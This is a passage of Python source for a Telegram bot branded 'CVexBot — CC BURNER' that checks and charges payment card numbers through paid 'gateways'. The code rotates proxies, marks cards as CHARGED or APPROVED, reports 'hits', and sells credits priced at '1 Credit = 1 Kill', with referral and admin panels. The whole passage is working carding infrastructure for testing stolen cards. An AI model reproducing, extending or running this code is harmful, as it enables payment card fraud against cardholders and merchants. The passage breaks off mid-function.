    def build(elapsed, stage="Processing"):
        return (f"{E_NUT} <b>Gateway</b> ↠ {gname} [ {price} ]\n"
                f"<b>CC</b> ↠ <code>{cc_raw}</code>\n"
                f"<b>Time</b> ↠ {elapsed}s | {stage}.{E_YELLOW}\n"
                f"──────•❥❥•──────\n"
                f"<b>CC Killing in progress..</b>{E_TOOLS}")

    status_msg = safe_reply(message, build(0), parse_mode='HTML', reply_markup=join_markup)
    stop_anim = threading.Event()
    if status_msg:
        start_anim(message.chat.id, status_msg.message_id, build, stop_anim, join_markup,
                   ["Processing", "Connecting", "Verifying", "Ending Checking"])

    bin_thread, bin_box = prefetch_bin(card['bin'])

    t0 = time.perf_counter()
    fn = API_FUNCS[gw_key]
    result = None
    for p in proxies[:4]:
        result = fn(cc_raw, p)
        if result['status'] != 'ERROR': break
    took = round(time.perf_counter() - t0, 2)

    stop_anim.set()
    try: bin_thread.join(1.2)
    except Exception: pass
    time.sleep(0.25)

    if not result or result['status'] == 'ERROR':
        reason = _clean_api_msg(result['msg']) if result else "no route"
        txt = (f"{E_CROSS} <b>{gname} Error</b>\n"
               f"──────•❥❥•──────\n"
               f"<b>CC</b> ↠ <code>{cc_raw}</code>\n"
               f"<b>Reason</b> ↠ {h_esc(reason)}\n"
               f"──────•❥❥•──────\n"
               f"<b>Please try again.</b>{E_YELLOW}")
    else:
        result['bin_box'] = bin_box
        txt = fmt_api(gname, price, card, cc_raw, result, took, uname, is_auth)

    print(f"[{time.strftime('%H:%M:%S')}] {gw_key.upper()} {(result['status'] if result else 'NONE')} | {took}s")
    if status_msg:
        safe_edit(message.chat.id, status_msg.message_id, txt, parse_mode='HTML',
                  disable_web_page_preview=True, reply_markup=join_markup)
    else:
        safe_send(message.chat.id, txt, parse_mode='HTML', reply_markup=join_markup)

    if result and result['status'] in ('CHARGED', 'APPROVED'):
        if is_auth:
            stat, kind = "ADDED", "AUTH"
        elif result['status'] == 'CHARGED':
            stat, kind = "CHARGED", "CHARGE"
        else:
            stat, kind = "APPROVED", "CHARGE"
        send_hit(gname, price, cc_raw, uname, took, 1, 0, stat, card['bin'], kind, "API")

# ==========================================
# TEXT / MENUS
# ==========================================
def is_admin(uid):
    if uid == OWNER_ID: return True
    u = get_user(uid)
    return bool(u and u[4] == 1)

def has_premium(uid):
    if uid == OWNER_ID: return True
    u = get_user(uid)
    if not u: return False
    if u[4] == 1: return True
    if u[3] == 1:
        if not u[5]: return True
        try:
            if datetime.strptime(u[5], "%Y-%m-%d %H:%M:%S") > datetime.now(): return True
        except Exception:
            pass
    return False

def is_banned(uid):
    u = get_user(uid)
    return bool(u and u[9] == 1)

_join_cache = {}
_join_lock = threading.Lock()

def is_joined(uid):
    if not FORCE_JOIN_ENABLED:
        return True

    try:
        s1 = bot.get_chat_member(FORCE_JOIN_CHANNEL, uid).status
        s2 = bot.get_chat_member(FORCE_JOIN_UPDATE, uid).status

        allowed = ("creator", "administrator", "member")

        return s1 in allowed and s2 in allowed

    except Exception as e:
        print(f"FORCE JOIN ERROR: {e}")
        return False
def get_plans_text():
    try:
        rows = list(db.plans.find({}).sort([("custom", 1), ("credits", 1)]))
        t = f"<b>{E_GIFT} Available Plans</b>\n"
        for row in rows:
            name = row.get("name") or row["_id"]
            creds = row.get("credits", 0); price = row.get("price", "0")
            days = row.get("days", 0); orig_price = row.get("original_price", ""); custom = row.get("custom", 0)
            t += f"{E_LINE}\n{E_STAR} <b>Plan: {h_esc(name)}</b>\n"
            if custom:
                t += f"╰┈➤ {E_HEART} Credits: <b>Choose your own</b>\n"
                t += f"╰┈➤ {E_CROWN} Price: <b>Choose your own</b>\n"
                t += f"╰┈➤ {E_FLASH} Validity: <b>Choose your own</b>\n"
            else:
                price_str = f"<s>${orig_price}</s> <b>${price}</b>" if orig_price and orig_price not in ('0', '') else f"<b>${price}</b>"
                t += f"╰┈➤ {E_HEART} Credits: <b>{int(creds):,}</b>\n"
                t += f"╰┈➤ {E_CROWN} Price: {price_str}\n"
                t += f"╰┈➤ {E_FLASH} Validity: <b>{days} Days</b>\n"
        t += f"{E_LINE}\n{E_FLASH} <b>1 Credit = 1 Kill</b>\n"
        t += f"{E_ARROW} Purchase: {OWNER_USERNAME}"
        return t
    except Exception as e:
        print(f"[PLANS ERR] {e}")
        return "Error loading plans."

def get_plans_markup():
    return json.dumps({"inline_keyboard": [
        [{"text": "Buy / Contact " + OWNER_USERNAME, "url": BUY_LINK, "style": "success"}],
        [{"text": "« Back", "callback_data": "menu_main", "style": "primary", "icon_custom_emoji_id": BTN_BACK}]
    ]})

def get_premium_required_text(cmd_name=""):
    return (f"{E_CROWN} <b>Premium Required</b>\n"
            f"{E_LINE}\n"
            f"This command requires Premium.\n"
            f"{E_LINE}\n"
            f"╰┈➤ {E_GIFT} View Plans: /plans\n"
            f"╰┈➤ {E_TECH} Contact: {OWNER_USERNAME}\n"
            f"{E_LINE}\n"
            f"<i>1 Credit = 1 Kill</i>")

def get_help_text():
    t = (f"<b>{E_STAR} All Commands</b>\n{E_LINE}\n"
         f"{E_CROWN} <b>Auth</b>\n")
    for g in get_gateways("AUTH"):
        cmd, name, price, cost, status, _, fmt = g
        if status != "ACTIVE": continue
        t += f"╰┈➤ <code>/{cmd} {fmt}</code> — {h_esc(name)} · {cost}cr\n"
    t += f"{E_LINE}\n{E_FIRE} <b>Charge</b>\n"
    for g in get_gateways("CHARGE"):
        cmd, name, price, cost, status, _, fmt = g
        if status != "ACTIVE": continue
        t += f"╰┈➤ <code>/{cmd} {fmt}</code> — {h_esc(name)} · {cost}cr\n"
    t += f"{E_LINE}\n{E_CROWN} <b>Killer</b> <i>(premium)</i>\n"
    for g in get_gateways("PREMIUM"):
        cmd, name, price, cost, status, _, fmt = g
        if status != "ACTIVE": continue
        t += f"╰┈➤ <code>/{cmd} {fmt}</code> — {h_esc(name)} · {cost}cr\n"
    t += (f"{E_LINE}\n{E_TOOLS} <b>Tools</b>\n"
          f"╰┈➤ <code>.addpx ip:port:user:pass</code>\n"
          f"╰┈➤ <code>.listpx</code> · <code>.rmpx 2</code>\n"
          f"{E_LINE}\n{E_TECH} <b>Account</b>\n"
          f"╰┈➤ <code>/cmds</code> · <code>/me</code> · <code>/plans</code>\n"
          f"{E_LINE}\n<i>Format: /gateway cc|mm|yy|cvv</i>")
    return t

def send_welcome(chat_id, name):
    sn = h_esc(name or "User")
    send_premium_sticker(chat_id, "welcome")
    txt = (f"{E_BUNNY} <b>#.CVexBot / v5.0 / ON</b>\n"
           f"{E_LINE}\n"
           f"~/ <b>Bash@CVex</b> ~> <i>Welcome back, {sn}!</i>\n"
           f"{E_FLASH} Bot active. Use /cmds.\n"
           f"{E_LINE}\n"
           f"[<a href='https://t.me/CvexChk'>緒</a>] {E_FIRE} <b>CVexBot — CC BURNER</b>")
    safe_send(chat_id, txt, parse_mode='HTML')

def get_main_markup(uid):
    kb = [
        [{"text": "Killer", "callback_data": "menu_killer_0", "style": "danger", "icon_custom_emoji_id": BTN_KILLER},
         {"text": "Gateways", "callback_data": "menu_gw_home", "style": "primary", "icon_custom_emoji_id": BTN_GATEWAY}],
        [{"text": "Refer & Earn", "callback_data": "menu_refer", "style": "success", "icon_custom_emoji_id": BTN_REF},
         {"text": "Plans", "callback_data": "menu_plans", "style": "primary", "icon_custom_emoji_id": BTN_PLANS}],
        [{"text": "Tools", "callback_data": "menu_tools", "style": "primary", "icon_custom_emoji_id": BTN_TOOLS},
         {"text": "Me", "callback_data": "menu_me", "style": "success", "icon_custom_emoji_id": BTN_ME}]
    ]
    if is_admin(uid):
        kb.append([{"text": "Admin Panel", "callback_data": "menu_admin", "style": "danger", "icon_custom_emoji_id": BTN_ADMIN}])
    return json.dumps({"inline_keyboard": kb})

def get_back_markup():
    return json.dumps({"inline_keyboard": [[{"text": "« Back", "callback_data": "menu_main", "style": "primary", "icon_custom_emoji_id": BTN_BACK}]]})

def get_admin_markup():
    return json.dumps({"inline_keyboard": [
        [{"text": "Add Plan", "callback_data": "admin_addplan", "style": "success", "icon_custom_emoji_id": BTN_PLANS},
         {"text": "Edit Gateway", "callback_data": "admin_editgw", "style": "primary", "icon_custom_emoji_id": BTN_GATEWAY}],
        [{"text": "Gen Keys", "callback_data": "admin_genkey", "style": "primary", "icon_custom_emoji_id": BTN_KILLER},
         {"text": "Add Credits", "callback_data": "admin_addcr", "style": "success", "icon_custom_emoji_id": BTN_ME}],
        [{"text": "Add Premium", "callback_data": "admin_addprem", "style": "success", "icon_custom_emoji_id": BTN_REF},
         {"text": "Gen Plan", "callback_data": "admin_genplan", "style": "success", "icon_custom_emoji_id": BTN_GENPLAN}],
        [{"text": "Gateway Settings", "callback_data": "admin_gw_list", "style": "primary", "icon_custom_emoji_id": BTN_TOOLS},
         {"text": "Withdrawals", "callback_data": "admin_withdrawals", "style": "danger", "icon_custom_emoji_id": BTN_WITHDRAW}],
        [{"text": "Broadcast", "callback_data": "admin_broadcast", "style": "danger", "icon_custom_emoji_id": BTN_ADMIN},
         {"text": "Stats", "callback_data": "admin_stats", "style": "success", "icon_custom_emoji_id": BTN_STATS}],
        [{"text": "« Back", "callback_data": "menu_main", "style": "primary", "icon_custom_emoji_id": BTN_BACK}]
    ]})

def get_gw_list_markup():
    kb = []
    for g in get_gateways():
        cmd, name, _, _, status, gw_type, _ = g
        em = "5318760565902947324" if status == "ACTIVE" else ("5316826301611390284" if status == "OFF" else "5278444373615337666")
        kb.append([{"text": f"{name} [{status}] ({gw_type})", "callback_data": f"admin_gw_set_{cmd}",
                    "style": "primary", "icon_custom_emoji_id": em}])
    kb.append([{"text": "« Back", "callback_data": "menu_admin", "style": "danger", "icon_custom_emoji_id": BTN_BACK}])
    return json.dumps({"inline_keyboard": kb})

def get_tools_markup():
    return json.dumps({"inline_keyboard": [
        [{"text": "List Proxies", "callback_data": "tool_listpx", "style": "primary", "icon_custom_emoji_id": BTN_GATEWAY},
         {"text": "Recheck", "callback_data": "tool_recheck", "style": "danger", "icon_custom_emoji_id": BTN_ADMIN}],
        [{"text": "« Back", "callback_data": "menu_main", "style": "primary", "icon_custom_emoji_id": BTN_BACK}]
    ]})

def build_gw_home():
    auth_n = len(get_gateways("AUTH")); chg_n = len(get_gateways("CHARGE"))
    txt = (f"<b>{E_LAPTOP} Gateways</b>\n{E_LINE}\n"
           f"╰┈➤ {E_CROWN} Auth » <b>{auth_n}</b>\n"
           f"╰┈➤ {E_FIRE} Charge » <b>{chg_n}</b>\n{E_LINE}\n"
           f"<i>Auth = card add, Charge = direct charge</i>")
    kb = [
        [{"text": "Auth", "callback_data": "menu_gw_auth", "style": "success", "icon_custom_emoji_id": BTN_GATEWAY}],
        [{"text": "Charge", "callback_data": "menu_gw_charge", "style": "danger", "icon_custom_emoji_id": BTN_GATEWAY}],
        [{"text": "« Back", "callback_data": "menu_main", "style": "primary", "icon_custom_emoji_id": BTN_BACK}]
    ]
    return txt, json.dumps({"inline_keyboard": kb})

def build_gw_page(page_type):
    is_charge = (page_type == "charge")
    gws = get_gateways("CHARGE" if is_charge else "AUTH")
    title = "Charge" if is_charge else "Auth"
    icon = E_FIRE if is_charge else E_CROWN
    txt = f"<b>{icon} {title} Gateways</b> » {len(gws)}\n"
    if not gws:
        txt += f"{E_LINE}\n{E_WARN} <i>Koi gateway nahi.</i>\n"
    for g in gws:
        cmd, name, price, cost, status, _, fmt = g
        em = E_CHECK if status == "ACTIVE" else (E_CROSS if status == "OFF" else E_WARN)
        st = "Active" if status == "ACTIVE" else ("Off" if status == "OFF" else ("DEACTIVATED" if status == "DEACTIVATED" else "Maint"))
        pr_line = f" | Price » {price}" if price else ""
        tag = " · Auth" if not is_charge else ""
        txt += (f"{E_LINE}\n{E_STAR} <b>{h_esc(name)}</b>{tag}\n"
                f"╰┈➤ St: {st} {em}\n"
                f"╰┈➤ <code>/{cmd} {fmt}</code>\n"
                f"╰┈➤ {E_ARROW} Cost » <b>{cost}</b>{pr_line}\n")
    txt += E_LINE
    if not is_charge:
        cmds = " · ".join(f"/{g[0]}" for g in gws if g[4] == "ACTIVE")
        if cmds:
            txt += f"\n{E_CROWN} <b>All Auth:</b> {cmds}"
    kb = [
        [{"text": "« Gateways", "callback_data": "menu_gw_home", "style": "primary", "icon_custom_emoji_id": BTN_BACK}],
        [{"text": "« Back", "callback_data": "menu_main", "style": "danger", "icon_custom_emoji_id": BTN_BACK}]
    ]
    return txt, json.dumps({"inline_keyboard": kb})

# ==========================================
# HANDLERS
# ==========================================
@bot.message_handler(commands=['ping'])
@crash_guard("ping")
def cmd_ping(message):
    t = time.perf_counter()
    m = safe_reply(message, "🏓 pong")
    if m:
        try:
            bot.edit_message_text(f"🏓 pong — {round((time.perf_counter() - t) * 1000)}ms", m.chat.id, m.message_id)
        except Exception:
            pass

@bot.message_handler(commands=['start'])
@crash_guard("start")
def cmd_start(message):
    uid = message.from_user.id; uname = message.from_user.username or ""
    user_states.pop(uid, None)
    if is_banned(uid):
        return safe_reply(message, f"{E_CROSS} You are banned.", parse_mode='HTML')

    args = (message.text or "").split()
    ref_by = 0; plan_code = None
    if len(args) > 1:
        if args[1].startswith("ref_"):
            found = db_get_user_by_ref_code(args[1].replace("ref_", ""))
            if found and found != uid: ref_by = found
        elif args[1].startswith("plan_"):
            plan_code = args[1].replace("plan_", "")

    user = get_user(uid)
    if not user:
        create_user(uid, uname, ref_by)
        user = get_user(uid)
    elif ref_by > 0 and not user[8]:
        create_user(uid, uname, ref_by)
        user = get_user(uid)

    if not user:
        return safe_reply(message, f"{E_CROSS} System busy. Please try /start again.", parse_mode='HTML')

    if not user[12]:
        n1, n2 = random.randint(10, 99), random.randint(10, 99)
        user_states[uid] = {'state': 'captcha', 'ans': n1 + n2, 'time': time.time(), 'attempts': 0}
        return safe_reply(message, f"<b>{E_TECH} Security Check</b>\n{E_LINE}\n{E_FLASH} What is <b>{n1} + {n2}</b>?\n{E_ARROW} Reply with number.\n{E_LINE}", parse_mode='HTML')

    if not is_joined(uid):
        mk = types.InlineKeyboardMarkup()
        mk.add(types.InlineKeyboardButton("📢 Join Channel", url=FORCE_JOIN_LINK))
        mk.add(types.InlineKeyboardButton("📢 Join Updates", url=FORCE_JOIN_UPDATE_LINK))
        mk.add(types.InlineKeyboardButton("✅ Verify", callback_data="verify_join"))
        return safe_reply(message, f"<b>{E_LAPTOP} #.CVexBot</b>\n{E_LINE}\n{E_EXCLAMATION} Join both channels to continue.\n{E_LINE}", parse_mode='HTML', reply_markup=mk)

    if plan_code:
        pc = db_activate_plan_code(plan_code, uid)
        if pc:
            plan_name = pc.get("plan_name"); credits_add = int(pc.get("credits") or 0); days = int(pc.get("days") or 0)
            exp = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d %H:%M:%S")
            update_credits(uid, credits_add)
            update_status(uid, 'is_premium', 1)
            update_status(uid, 'expiry_date', exp)
            safe_send(uid,
                f"{E_CHECK} <b>Plan Activated!</b>\n{E_LINE}\n"
                f"╰┈➤ {E_STAR} Plan : <b>{h_esc(plan_name)}</b>\n"
                f"╰┈➤ {E_HEART} Credits : <b>+{credits_add}</b>\n"
                f"╰┈➤ {E_CROWN} Premium : <b>Active</b>\n"
                f"╰┈➤ {E_FLASH} Expires : <b>{exp}</b>\n"
                f"{E_LINE}\n{E_ARROW} Use /cmds to start!", parse_mode='HTML')
        else:
            safe_send(uid, f"{E_CROSS} Invalid or used plan code.", parse_mode='HTML')

    send_welcome(message.chat.id, message.from_user.first_name)

@bot.message_handler(commands=['cmds', 'menu'])
@crash_guard("cmds")
def cmd_cmds(message):
    uid = message.from_user.id
    if is_banned(uid): return
    if not is_joined(uid):
        mk = types.InlineKeyboardMarkup()
        mk.add(types.InlineKeyboardButton("📢 Join Channel", url=FORCE_JOIN_LINK))
        mk.add(types.InlineKeyboardButton("📢 Join Updates", url=FORCE_JOIN_UPDATE_LINK))
        mk.add(types.InlineKeyboardButton("✅ Verify", callback_data="verify_join"))
        return safe_reply(message, f"{E_LAPTOP} <b>‼️ Join both channels to continue.</b>", parse_mode='HTML', reply_markup=mk)
    ensure_user(uid, message.from_user.username or "")
    safe_send(message.chat.id, f"<b>{E_STAR} Main Menu</b>\n{E_ARROW} Select option:", parse_mode='HTML', reply_markup=get_main_markup(uid))

@bot.message_handler(commands=['help', 'cmdlist', 'commands'])
@crash_guard("help")
def cmd_help(message):
    uid = message.from_user.id
    if is_banned(uid): return
    ensure_user(uid, message.from_user.username or "")
    safe_send(message.chat.id, get_help_text(), parse_mode='HTML', reply_markup=get_back_markup())

@bot.message_handler(commands=['auth'])
@crash_guard("auth")
def cmd_auth(message):
    uid = message.from_user.id
    if is_banned(uid): return
    ensure_user(uid, message.from_user.username or "")
    txt, kb = build_gw_page("auth")
    safe_send(message.chat.id, txt, parse_mode='HTML', reply_markup=kb)

@bot.message_handler(commands=['charge'])
@crash_guard("charge")
def cmd_charge(message):
    uid = message.from_user.id
    if is_banned(uid): return
    ensure_user(uid, message.from_user.username or "")
    txt, kb = build_gw_page("charge")
    safe_send(message.chat.id, txt, parse_mode='HTML', reply_markup=kb)

@bot.callback_query_handler(func=lambda c: True)
@crash_guard("callback")
def handle_cb(call):
    uid = call.from_user.id; data = call.data
    if data != "verify_join":
        user = ensure_user(uid, call.from_user.username or "")
        if not user:
            return safe_answer(call.id, "❌ System busy. Try /start", show_alert=True)
    is_adm = is_admin(uid)

    if data == "verify_join":
        safe_answer(call.id, "⏳...")
        if is_joined(uid):
            try: bot.delete_message(call.message.chat.id, call.message.message_id)
            except Exception: pass
            send_welcome(call.message.chat.id, call.from_user.first_name)
        else:
            safe_answer(call.id, "❌ Not joined both channels!", show_alert=True)

    elif data == "menu_main":
        safe_edit(call.message.chat.id, call.message.message_id, f"<b>{E_STAR} Main Menu</b>\n{E_ARROW} Select option:", parse_mode='HTML', reply_markup=get_main_markup(uid))
    elif data == "menu_plans":
        safe_edit(call.message.chat.id, call.message.message_id, get_plans_text(), parse_mode='HTML', reply_markup=get_plans_markup())
    elif data == "menu_me":
        u = get_user(uid)
        if not u: return safe_answer(call.id, "❌ Please /start first.", show_alert=True)
        prem = f"{E_CHECK} Active ({u[5]})" if has_premium(uid) else f"{E_CROSS} Free"
        cd = "—" if is_adm else f"{cooldown_left(uid)}s"
        txt = (f"<b>{E_TECH} Profile</b>\n{E_LINE}\n╰┈➤ 🆔 ID: <code>{uid}</code>\n"
               f"╰┈➤ {E_HEART} Credits: <b>{u[2]}</b>\n╰┈➤ {E_CROWN} Premium: <b>{prem}</b>\n"
               f"╰┈➤ 👥 Refs: <b>{u[10]}/5</b>\n╰┈➤ {E_CLOCK} Cooldown: <b>{cd}</b>\n{E_LINE}")
        safe_edit(call.message.chat.id, call.message.message_id, txt, parse_mode='HTML', reply_markup=get_back_markup())
    elif data == "menu_refer":
        u = get_user(uid)
        if not u: return safe_answer(call.id, "❌ Please /start first.", show_alert=True)
        if not u[7]:
            new_code = secrets.token_urlsafe(8)
            with db_write_lock:
                db.users.update_one({"id": uid}, {"$set": {"refer_code": new_code}})
            invalidate_cache(uid)
            u = get_user(uid)
        try: bot_username = bot.get_me().username
        except Exception: bot_username = "CvexChkBot"
        link = f"https://t.me/{bot_username}?start=ref_{u[7]}"
        txt = (f"<b>{E_HEART} Refer & Earn</b>\n{E_LINE}\nInvite friends to earn credits!\n"
               f"╰┈➤ Link: <code>{link}</code>\n╰┈➤ Total: <b>{u[10]}/5</b>\n\n"
               f"<i>Withdraw 5 credits when 5+ refs</i>\n{E_LINE}")
        kb = json.dumps({"inline_keyboard": [
            [{"text": "Withdraw 5 Credits", "callback_data": "ref_withdraw", "style": "success", "icon_custom_emoji_id": BTN_WITHDRAW}],
            [{"text": "« Back", "callback_data": "menu_main", "style": "primary", "icon_custom_emoji_id": BTN_BACK}]]})
        safe_edit(call.message.chat.id, call.message.message_id, txt, parse_mode='HTML', reply_markup=kb)
    elif data == "menu_tools":
        txt = f"<b>{E_TOOLS} Tools</b>\n{E_LINE}\n{E_FLASH} <code>.addpx ip:port:user:pass</code>\n{E_CHECK} <code>.listpx</code>\n{E_CROSS} <code>.rmpx num</code>\n{E_LINE}"
        safe_edit(call.message.chat.id, call.message.message_id, txt, parse_mode='HTML', reply_markup=get_tools_markup())

    elif data == "menu_gw_home":
        txt, kb = build_gw_home()
        safe_edit(call.message.chat.id, call.message.message_id, txt, parse_mode='HTML', reply_markup=kb)
    elif data in ("menu_gw_charge", "menu_gw_auth"):
        txt, kb = build_gw_page("charge" if data.endswith("charge") else "auth")
        safe_edit(call.message.chat.id, call.message.message_id, txt, parse_mode='HTML', reply_markup=kb)

    elif data.startswith("menu_killer_"):
        page = int(data.split("_")[2])
        user_has_prem = has_premium(uid)
        gws = get_gateways("PREMIUM")
        ipp = 3
        tp = max(1, (len(gws) + ipp - 1) // ipp)
        if page >= tp: page = 0
        if page < 0: page = tp - 1
        cur = gws[page * ipp:(page + 1) * ipp]
        txt = f"<b>{E_CROWN} Premium Killers</b>\n» Page {page + 1}/{tp} | ⚪ {len(gws)}\n"
        if not user_has_prem: txt += f"<i>🔒 Premium required to use</i>\n"
        for g in cur:
            cmd, name, price, cost, status, _, fmt = g
            em = E_CHECK if status == "ACTIVE" else E_WARN
            st = "Active" if status == "ACTIVE" else ("Off" if status == "OFF" else "Maint")
            lock = "" if user_has_prem else " 🔒"
            txt += (f"{E_LINE}\n{E_STAR} <b>{h_esc(name)}{lock}</b>\n╰┈➤ St: {st} {em}\n"
                    f"╰┈➤ <code>/{cmd} {fmt}</code>\n{E_ARROW} <b>Cost</b> » {cost}\n")
        txt += E_LINE
        kb = []
        nav = []
        if page > 0: nav.append({"text": "« Prev", "callback_data": f"menu_killer_{page - 1}", "style": "primary", "icon_custom_emoji_id": BTN_BACK})
        if page < tp - 1: nav.append({"text": "Next »", "callback_data": f"menu_killer_{page + 1}", "style": "primary", "icon_custom_emoji_id": BTN_BACK})
        if nav: kb.append(nav)
        kb.append([{"text": "« Back", "callback_data": "menu_main", "style": "danger", "icon_custom_emoji_id": BTN_BACK}])
        safe_edit(call.message.chat.id, call.message.message_id, txt, parse_mode='HTML', reply_markup=json.dumps({"inline_keyboard": kb}))

    elif data == "ref_withdraw":
        u = get_user(uid)
        if not u: return safe_answer(call.id, "❌ Please /start first.", show_alert=True)
        if u[10] < 5: return safe_answer(call.id, "❌ Need 5 refs.", show_alert=True)
        with db_write_lock:
            wid = db_create_withdrawal(uid, 5)
            db.users.update_one({"id": uid}, {"$inc": {"ref_credits": -5}})
        invalidate_cache(uid)
        try:
            kb = {"inline_keyboard": [[
                {"text": "✅ Approve", "callback_data": f"w_app_{wid}", "style": "success", "icon_custom_emoji_id": "5318760565902947324"},
                {"text": "❌ Decline", "callback_data": f"w_dec_{wid}", "style": "danger", "icon_custom_emoji_id": "5316826301611390284"}
            ]]}
            safe_send(OWNER_ID, f"💸 <b>WITHDRAWAL REQUEST</b>\n{E_LINE}\n👤 @{u[1] or uid}\n🆔 <code>{uid}</code>\n💰 Amount: 5 Credits\n📊 Refs: {u[10]}\n{E_LINE}", parse_mode='HTML', reply_markup=json.dumps(kb))
        except Exception:
            pass
        safe_answer(call.id, "✅ Sent to Admin!", show_alert=True)

    elif data == "menu_admin":
        if not is_adm: return
        safe_edit(call.message.chat.id, call.message.message_id, f"<b>{E_CROWN} Admin Panel</b>\n{E_LINE}", parse_mode='HTML', reply_markup=get_admin_markup())
    elif data == "admin_gw_list":
        if not is_adm: return
        safe_edit(call.message.chat.id, call.message.message_id, f"<b>{E_TOOLS} Gateway Settings</b>", parse_mode='HTML', reply_markup=get_gw_list_markup())
    elif data.startswith("admin_gw_set_"):
        if not is_adm: return
        cmd = data.replace("admin_gw_set_", ""); g = get_gateway(cmd)
        if not g: return
        kb = [
            [{"text": "Active", "callback_data": f"admin_gw_upd_{cmd}_ACTIVE", "style": "success", "icon_custom_emoji_id": "5318760565902947324"},
             {"text": "Off", "callback_data": f"admin_gw_upd_{cmd}_OFF", "style": "danger", "icon_custom_emoji_id": "5316826301611390284"}],
            [{"text": "DEACTIVATED", "callback_data": f"admin_gw_upd_{cmd}_DEACTIVATED", "style": "primary", "icon_custom_emoji_id": "5278444373615337666"}],
            [{"text": f"Type: {g[5]} ➡️", "callback_data": f"admin_gw_type_{cmd}", "style": "success", "icon_custom_emoji_id": BTN_TOOLS}],
            [{"text": "« Back", "callback_data": "admin_gw_list", "style": "primary", "icon_custom_emoji_id": BTN_BACK}]
        ]
        safe_edit(call.message.chat.id, call.message.message_id, f"<b>{E_TOOLS} {h_esc(g[1])}</b>\n{E_LINE}\n╰┈➤ Type: <b>{g[5]}</b>\n╰┈➤ Cost: <b>{g[3]}</b>", parse_mode='HTML', reply_markup=json.dumps({"inline_keyboard": kb}))
    elif data.startswith("admin_gw_upd_"):
        if not is_adm: return
        parts = data.split("_"); cmd, new_st = parts[3], parts[4]
        db_set_gateway(cmd, "status", new_st)
        safe_answer(call.id, f"✅ {new_st}")
        safe_edit(call.message.chat.id, call.message.message_id, f"<b>{E_TOOLS} Settings</b>", parse_mode='HTML', reply_markup=get_gw_list_markup())
    elif data.startswith("admin_gw_type_"):
        if not is_adm: return
        cmd = data.replace("admin_gw_type_", ""); g = get_gateway(cmd)
        if not g: return
        cycle = {"CHARGE": "AUTH", "AUTH": "PREMIUM", "PREMIUM": "CHARGE"}
        nt = cycle.get(g[5], "CHARGE")
        db_set_gateway(cmd, "type", nt)
        safe_answer(call.id, f"✅ Type: {nt}")
        safe_edit(call.message.chat.id, call.message.message_id, f"<b>{E_TOOLS} Settings</b>", parse_mode='HTML', reply_markup=get_gw_list_markup())
    elif data == "admin_withdrawals":
        if not is_adm: return
        rows = db_pending_withdrawals()
        if not rows: return safe_answer(call.id, "No pending.", show_alert=True)
        kb = []
        for w in rows:
            kb.append([{"text": f"✅ {w['amount']}cr ID:{w['user_id']}", "callback_data": f"w_app_{w['_id']}", "style": "success", "icon_custom_emoji_id": "5318760565902947324"},
                       {"text": "❌ Decline", "callback_data": f"w_dec_{w['_id']}", "style": "danger", "icon_custom_emoji_id": "5316826301611390284"}])
        kb.append([{"text": "« Back", "callback_data": "menu_admin", "style": "primary", "icon_custom_emoji_id": BTN_BACK}])
        safe_edit(call.message.chat.id, call.message.message_id, f"<b>{E_CROWN} Pending</b>", parse_mode='HTML', reply_markup=json.dumps({"inline_keyboard": kb}))
    elif data.startswith("w_app_"):
        if not is_adm: return
        wid = int(data.split("_")[2])
        doc = db_approve_withdrawal(wid)
        if not doc: return safe_answer(call.id, "❌ Not found", show_alert=True)
        safe_answer(call.id, "✅ Approved")
        send_withdraw_approved(doc["user_id"], doc["amount"])
        safe_edit(call.message.chat.id, call.message.message_id, f"✅ Approved {doc['amount']}cr to <code>{doc['user_id']}</code>", parse_mode='HTML')
    elif data.startswith("w_dec_"):
        if not is_adm: return
        wid = int(data.split("_")[2])
        user_states[uid] = {'state': 'admin_dec_reason', 'w_id': wid}
        safe_send(call.message.chat.id, "Enter reason:", parse_mode='HTML')
    elif data == "admin_stats":
        if not is_adm: return
        tot = db.users.count_documents({})
        pr = db.users.count_documents({"is_premium": 1})
        safe_answer(call.id, f"👥 Users: {tot}\n💎 Premium: {pr}", show_alert=True)

    elif data == "admin_addplan":
        if not is_adm: return
        user_states[uid] = {'state': 'admin_addplan_name'}
        safe_send(call.message.chat.id, f"{E_STAR} Enter Plan Name:", parse_mode='HTML')
    elif data == "admin_editgw":
        if not is_adm: return
        user_states[uid] = {'state': 'admin_editgw_cmd'}
        safe_send(call.message.chat.id, f"{E_STAR} Enter Gateway cmd (bl, k1):", parse_mode='HTML')
    elif data == "admin_broadcast":
        if not is_adm: return
        user_states[uid] = {'state': 'admin_broadcast'}
        safe_send(call.message.chat.id, f"{E_STAR} Send anything to broadcast:", parse_mode='HTML')
    elif data == "admin_genkey":
        if not is_adm: return
        user_states[uid] = {'state': 'admin_genkey_days'}
        safe_send(call.message.chat.id, f"{E_STAR} Enter Days:", parse_mode='HTML')
    elif data == "admin_addcr":
        if not is_adm: return
        user_states[uid] = {'state': 'admin_addcr_target'}
        safe_send(call.message.chat.id, f"{E_STAR} Enter User ID / @username:", parse_mode='HTML')
    elif data == "admin_addprem":
        if not is_adm: return
        user_states[uid] = {'state': 'admin_addprem_target'}
        safe_send(call.message.chat.id, f"{E_STAR} Enter User ID / @username:", parse_mode='HTML')
    elif data == "admin_genplan":
        if not is_adm: return
        txt = (f"{E_GIFT} <b>Generate Plan Code</b>\n{E_LINE}\n"
               f"<code>/genplan &lt;plan_name&gt;</code>\n"
               f"<code>/genplan &lt;name&gt; &lt;credits&gt; &lt;price&gt; &lt;days&gt;</code>\n\n"
               f"<b>Examples:</b>\n<code>/genplan SHADOW</code>\n<code>/genplan GodMode 5000 100 30</code>")
        safe_send(call.message.chat.id, txt, parse_mode='HTML', reply_markup=get_admin_markup())

    elif data == "tool_listpx":
        u = get_user(uid); px = [x for x in u[6].split('\n') if x.strip()] if u and u[6] else []
        if not px: return safe_answer(call.id, "❌ No proxies.", show_alert=True)
        txt = f"{E_TOOLS} <b>Your Proxies ({len(px)}):</b>\n\n"
        for i, p in enumerate(px): txt += f"<code>{i + 1}. {h_esc(p)}</code>\n"
        txt += f"\n{E_ARROW} Use <code>.rmpx num</code>"
        safe_edit(call.message.chat.id, call.message.message_id, txt, parse_mode='HTML', reply_markup=get_tools_markup())
    elif data == "tool_recheck":
        u = get_user(uid); px = [x for x in u[6].split('\n') if x.strip()] if u and u[6] else []
        if not px: return safe_answer(call.id, "❌ No proxies.", show_alert=True)
        safe_answer(call.id, "⏳ Rechecking...")
        msg = safe_send(call.message.chat.id, f"{E_FLASH} Checking {len(px)}...", parse_mode='HTML')
        def do_recheck():
